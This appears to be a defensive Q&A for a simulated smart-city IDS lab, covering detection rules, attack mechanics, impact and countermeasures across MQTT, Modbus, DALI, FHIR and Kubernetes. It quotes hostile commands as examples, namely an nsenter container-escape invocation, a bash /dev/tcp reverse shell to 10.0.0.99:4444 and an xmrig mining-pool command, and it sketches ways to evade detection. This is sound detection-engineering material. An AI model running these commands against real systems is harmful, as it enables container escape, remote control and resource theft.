# Detection, Telemetry, Attack Mechanics, Impact, and Countermeasures Q&A

Date: 2026-02-20
Scope: Smart City IDS simulated scenarios (Falco + Suricata + IoT protocol emulators).

This document answers all requested questions with two lenses:
- `Current project reality`: what is implemented or modeled in this repository.
- `Production-grade guidance`: concrete controls/signatures/policies to implement for real deployments.

## 1) Detection & Telemetry

### Q1. Falco eBPF detection of `nsenter` in Container Escape + false positives
- Current project reality: the scenario is modeled as `nsenter --target 1 --mount --uts --ipc --net --pid` and tagged as container escape (`services/ids-api/static/index.html`).
- Detection logic (production): Falco catches `execve/execveat` for `proc.name=nsenter` with suspicious args (`--target 1`, namespace flags) and container context.
- Practical false positives: most FPs come from legitimate debug flows (`kubectl debug`, node troubleshooting containers). In tuned clusters, this is usually low single-digit % of alerts; untuned, it can be noisy.
- Recommended exception strategy:
  - allow only signed debug images;
  - allow only `ops-debug` namespace;
  - require pod label like `security.smartcity/debug-approved=true`;
  - keep all other `nsenter` in workload namespaces as critical.

### Q2. Suricata SID for MQTT flood (10,000 CONNECT/s) and differentiating reconnect storms
- Current project reality: attack descriptions include 10,000 CONNECT/s broker flood in UI text (`services/ids-api/static/index.html`), but no dedicated custom SID is shipped.
- Recommended custom rule (example):
```suricata
alert tcp any any -> $MQTT_BROKER 1883 (
  msg:"SCIDS MQTT CONNECT flood";
  flow:to_server,established;
  content:"|10|"; offset:0; depth:1;
  threshold:type both, track by_dst, count 10000, seconds 1;
  classtype:attempted-dos;
  sid:9901001; rev:1;
)
```
- Differentiate legitimate reconnect storm vs attack:
  - reconnect storm: known client IDs, correlated link flap event, normal publish resumes quickly;
  - attack: random/high-entropy client IDs, little/no publish after CONNECT, many auth failures, multi-source distribution.

### Q3. OPC UA anomaly signatures for Modbus FC6 AQI threshold writes; why IT IDS misses this
- Current project reality: scenario explicitly models unauthorized Modbus write impacting AQI registers (`services/ids-api/static/index.html`, `docs/PROJECT_METRICS.md`).
- Recommended detection signatures:
  - Modbus: alert on FC6/FC16 writes to AQI-critical registers (40001-40016) outside maintenance window.
  - OPC UA: alert on `WriteRequest` to mapped AQI threshold nodes with out-of-range values or sudden >X% delta.
  - Cross-check invariant: `AQI node` must be derivable from PM2.5/PM10 trend; mismatch triggers integrity alert.
- Why standard IT IDS fails: it sees valid TCP sessions, not process semantics/safety setpoint meaning.

### Q4. TALQ v2.4 command structure in DALI blackout (broadcast `0xFF` vs short addressing) and malicious frame detection
- Current project reality: scenario models TALQ-triggered all-lights-to-0% blackout (`services/ids-api/static/index.html`).
- Control detail:
  - broadcast addressing (`0xFF` semantics in this scenario) causes fleet-wide immediate dim/off;
  - short/group addressing affects subsets and is normal for scheduled zoning.
- Detection approach:
  - alert on out-of-schedule broadcast dim/off commands;
  - alert on command burst rate above scheduler baseline;
  - correlate with TALQ scheduler job IDs (missing job ID + broadcast = suspicious).

### Q5. ANPR DNS tunneling pattern (50-byte TXT every 200ms) vs OilRig BONDUPDATER / DNSpionage tradecraft
- Current project reality: scenario states 50-byte TXT queries every 200ms for `plates.db` exfil (`services/ids-api/static/index.html`).
- Comparison:
  - your pattern is high-rate and regular (very detectable);
  - mature APT tradecraft usually adds jitter, variable chunk size, staged domains, and blends query types.
- Specific note:
  - DNSpionage is known more for DNS hijacking/credential ops than a simple fixed-rate TXT tunnel pattern.
  - Treat this scenario as a deliberate, detectable benchmark rather than stealth-maximized tradecraft.

## 2) Attack Mechanics

### Q6. ONVIF camera DDoS at 200K pps: packet structure and why RTSP path is targeted
- Current project reality: UI text says UDP/SYN flood at 200K pps against ONVIF Profile S camera path (`services/ids-api/static/index.html`).
- Most realistic for this scenario: direct SYN/UDP flood at stream-critical ports (RTSP/media path), not DNS amplification (UDP/53).
- Why RTSP over HTTP management:
  - degrading stream path blinds ANPR in real time;
  - management HTTP can remain partially reachable while mission function fails.

### Q7. Reverse shell `/dev/tcp/10.0.0.99/4444` in Falco logs vs `/bin/bash -c`
- Current project reality: reverse shell command appears explicitly in demo payloads (`scripts/demo-e2e-pipeline.py`).
- Falco `execve` view:
  - direct: `proc.cmdline` contains `bash -i >& /dev/tcp/...`;
  - wrapped: `proc.name=/bin/bash`, args include `-c`, payload string holds `/dev/tcp/...`.
- Why NIDS can miss it:
  - outbound TCP can look like generic egress without strong signature;
  - encrypted/tunneled channels or non-standard ports reduce signature certainty.

### Q8. Cryptominer XMRig config that triggers ET MALWARE and evasion via proxy pools
- Current project reality: legacy sample payloads referenced `xmrig ... stratum+tcp://pool.minexmr.com:3333` in older demo scripts. Use `scripts/run-live-attacks.sh` as the current attack runner and validate payload examples against current script sources before citing.
- Typical triggers:
  - plain Stratum handshake over `stratum+tcp`;
  - known pool domains/ports;
  - mining authorization strings/wallet patterns in cleartext channels.
- Evasion:
  - `stratum+ssl` (often 443), self-hosted proxy relays, rotating C2/pool endpoints, domain fronting-like indirection.

### Q9. FHIR tamper via `PUT /fhir/Patient/{id}/MedicationRequest` bypassing OWASP WAF; FHIR-specific checks for 10x insulin
- Current project reality: scenario models 10U -> 100U insulin tamper (`services/ids-api/static/index.html`).
- Why generic WAF misses it: request is syntactically valid JSON + valid REST route.
- What catches it:
  - FHIR R4 profile validation (StructureDefinition conformance);
  - dosage guardrails using FHIRPath/business rules (max delta, max daily dose, unit consistency);
  - clinical plausibility checks against patient context.

### Q10. MQTT -> OPC UA pivot replay via `env/+/readings` and why OPC UA PubSub signing may not stop it
- Replay vector: permissive wildcard subscriptions with reusable telemetry payloads and weak nonce/timestamp validation.
- QoS impact:
  - QoS 0: easy replay/no delivery guarantees;
  - QoS 1/2: duplicate suppression helps delivery semantics, not semantic replay if payload is old-but-valid.
- Why OPC UA signing may not stop it:
  - if replay happens before bridge trust boundary, bridge republishes as a trusted producer;
  - signing protects channel integrity, not business semantics unless freshness/sequence checks are enforced end-to-end.

## 3) Impact & Consequences

### Q11. Host capabilities required for `nsenter` escape and why PodSecurity controls can fail
- Typical requirements: `CAP_SYS_ADMIN` (primary), often `CAP_SYS_PTRACE`, plus risky settings (`hostPID`, privileged, broad mount access).
- Why policy misses occur:
  - permissive namespace exemptions;
  - legacy workloads with privileged exceptions;
  - policy checks at admission, but runtime drift/hostPath combinations still expose escape paths.

### Q12. K8s serviceaccount token harvest vs Tesla case; limits of Bound Service Account Tokens
- Date correction: major Tesla Kubernetes cryptojacking exposure was publicly reported in 2018 (not a canonical 2022 case).
- Bound token helps by scoping TTL/audience, but does not help if attacker already has live pod execution and steals a currently valid token.
- Real control is least-privilege RBAC + short token TTL + deny metadata/token file access where possible + egress controls to API server.

### Q13. DALI-2 blackout blast radius, emergency lighting independence, NFPA 101 concerns
- Operationally, blast radius depends on whether emergency egress lighting is electrically/logically isolated from TALQ/DALI control plane.
- Maintained/non-maintained emergency luminaires should remain code-compliant under failure modes.
- If compromise darkens required egress illumination, this can create NFPA 101 egress lighting non-compliance and immediate life-safety risk.

### Q14. Modbus AQI falsification impact on AirNow and Clean Air Act liability exposure
- Integrity impact: spoofed AQI can distort public health advisories and emergency response decisions.
- Compliance risk: reporting/QA obligations for ambient air systems (e.g., 40 CFR Part 58 workflows) can be violated by untrusted data pipelines.
- Liability exposure: regulatory enforcement, consent actions, and civil claims depending on harm and negligence posture.
- This is not legal advice; treat as risk framing for counsel/compliance teams.

### Q15. FHIR insulin overdose structure (10U -> 100U) and relation to 2019 FDA smart pump warnings
- Tamper field is typically:
  - `MedicationRequest.dosageInstruction[0].doseAndRate[0].doseQuantity.value`
  - unit in `doseQuantity.unit`/`code`.
- Attack pattern: value change with preserved schema validity.
- Relevance to FDA 2019 advisories: connected insulin delivery ecosystems showed cybersecurity risk where authorized-looking commands/data changes can cause unsafe dosing.

## 4) Defensive Countermeasures

### Q16. Falco exceptions for legitimate ONVIF firmware updates vs DDoS noise; threshold tuning
- Falco should focus on runtime process anomalies (not packet flood volume).
- Recommended exception dimensions:
  - process allowlist (`fwupdater`, vendor updater binaries);
  - signer/image digest allowlist;
  - maintenance window labels/annotations.
- Tuning for alert fatigue:
  - alert on unexpected updater execution >N times per 10 minutes outside maintenance;
  - downgrade severity for approved window + signed updater.

### Q17. eBPF policy (CiliumClusterwideNetworkPolicy) to block `nmap -sV` without breaking DNS
- Strategy: default-deny egress for workload class, then explicit allow:
  - kube-dns UDP/TCP 53;
  - required service CIDRs/ports only.
- Minimal example:
```yaml
apiVersion: cilium.io/v2
kind: CiliumClusterwideNetworkPolicy
metadata:
  name: iot-egress-restrict
spec:
  endpointSelector:
    matchLabels:
      app.kubernetes.io/part-of: smart-city-iot
  egress:
  - toEndpoints:
    - matchLabels:
        k8s:io.kubernetes.pod.namespace: kube-system
        k8s:k8s-app: kube-dns
    toPorts:
    - ports:
      - port: "53"
        protocol: UDP
      - port: "53"
        protocol: TCP
  - toCIDR:
    - 10.43.0.0/16
    toPorts:
    - ports:
      - port: "1883"
        protocol: TCP
      - port: "4840"
        protocol: TCP
```
- Result: broad scan traffic is blocked; required DNS and ICS ports remain functional.

### Q18. MQTT flood rate limit and MQTT v5 AUTH interaction; breakage for v3.1.1 devices
- If limiter counts only CONNECT packets, v5 enhanced auth sessions can be misclassified unless AUTH packet progression is tracked.
- Legacy v3.1.1 clients often reconnect aggressively with no advanced backoff/session features.
- Mitigation:
  - per-client-ID/token bucket;
  - separate thresholds for CONNECT and AUTH phases;
  - grace window after broker restart/partition events.

### Q19. Kubernetes NetworkPolicy egress rules to block cryptominer Stratum without breaking NTP/updates
- Pattern:
  - default deny egress;
  - allow DNS (53), NTP (123/UDP) to trusted time sources, and package update endpoints via approved egress gateway.
- Block outcomes:
  - direct Stratum ports (3333/4444/5555/7777) denied;
  - unknown internet egress denied unless through controlled proxy.
- Note: native NetworkPolicy is CIDR/port-based, not FQDN-aware.

### Q20. DLP for ANPR `/var/lib/anpr/plates.db` (SQLite WAL mode) pre-exfil detection
- Monitor file access triplet: `plates.db`, `plates.db-wal`, `plates.db-shm`.
- High-signal pre-exfil chain:
  - unusual process (`sqlite3`, ad-hoc python) opens DB files;
  - bulk SELECT/read spike;
  - immediate compression/encoding (`gzip`, `base64`, custom chunking);
  - outbound DNS TXT anomaly from same container.
- Combine Falco file/process telemetry + DNS analytics for correlation-based detection.

## Appendix: Where Scenario Facts Come From in This Repo

- Attack scenario descriptions and named conditions:
  - `services/ids-api/static/index.html`
  - `services/ids-api/static/js/modules/attacks.js`
- Real/semireal attack pipeline payloads:
  - `scripts/run-live-attacks.sh` (current)
  - historical references may appear in archived/legacy scripts
- Protocol and register map context:
  - `docs/PROJECT_METRICS.md`
  - `docs/IOT_EMULATION_REPORT.md`
